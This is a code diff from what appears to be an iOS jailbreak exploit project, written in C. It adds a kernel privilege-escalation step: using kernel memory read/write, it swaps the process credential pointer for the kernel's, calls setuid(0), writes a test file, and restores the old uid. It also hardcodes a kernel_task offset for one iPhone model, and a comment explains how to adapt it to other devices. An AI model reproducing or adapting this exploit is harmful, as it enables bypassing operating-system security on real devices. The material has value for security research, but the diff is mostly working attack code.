@@ -8,6 +8,7 @@
 #include <spawn.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <sys/utsname.h>
 
 #include <pthread.h>
 
@@ -884,15 +885,22 @@ kern_return_t get_root (uint64_t kernel_task) {
     
     uint64_t our_cred = rk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
     
+    uid_t old = getuid();
+    
     wk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
     
     
     printf("[INFO]: successfully wrote our kern_ucred into our cred!\n");
-    
     setuid(0);
-    printf("[INFO]: getuid: %d\n", getuid());
-    int fd = open("/var/mobile/xxx", O_WRONLY);
-    
+    printf("[INFO]: new uid: %d\n", getuid());
+    FILE *f = fopen("/var/mobile/test.txt", "w");
+    if(f == 0){
+        printf("[INFO]: failed to write test file");
+    }else{
+        printf("[INFO]: wrote test file: %p\n", f);
+    }
+    setuid(old);
+    printf("[INFO]: changed back to old uid: %d\n", getuid());
     // you'll probably panic few seconds after this thanks to the new sandbox protections
     
     return ret;
@@ -902,20 +910,34 @@ mach_port_t go() {
   mach_port_t tfp0 = get_kernel_memory_rw();
   printf("tfp0: %x\n", tfp0);
     
+    /**
+     
+     We can now temporarily gain root! I think we have to swap back to the old uid to prevent kernel panics though.
+     
+     Here's how to do this on your phone:
+     - Find your OFFSET_KERNEL_TASK using this guide from uroboro: https://gist.github.com/uroboro/5b2b2b2aa1793132c4e91826ce844957
+     - Add your device to the u.machine comparisons (add an 'else if' with your device) and set the offset
+     - Check console to ensure the test file is written!
+     - GG root.
+     
+     */
     
-    /*uint64_t kernelbase = find_kernel_base();
+    struct utsname u = {0};
+    uname(&u);
     
-    extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
-    uint64_t magic = 0;
-    mach_vm_size_t sz = sizeof(magic);
-    kern_return_t ret = mach_vm_read_overwrite(tfp0, kernelbase, sizeof(magic), (mach_vm_address_t)&magic, &sz);
-    printf("mach_vm_read_overwrite: %x, %s\n", magic, mach_error_string(ret));
+    uint64_t OFFSET_KERNEL_TASK = 0;
     
-    FILE *f = fopen("/var/mobile/test.txt", "w");
-    if(f == 0){
-        printf("failed to write file\n");
-    }*/
+    if(strstr(u.machine, "iPhone8,4")){
+        OFFSET_KERNEL_TASK = 0xfffffff00760a048;
+    }
     
+    if(OFFSET_KERNEL_TASK != 0){
+        uint64_t kt = rk64(find_kernel_base() + (OFFSET_KERNEL_TASK-0xFFFFFFF007004000));
+        get_root(rk64(kt + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)));
+    }
+    
+    
+
     //char* env_path = prepare_payload();
     //printf("will launch a shell with this environment: %s\n", env_path);
     
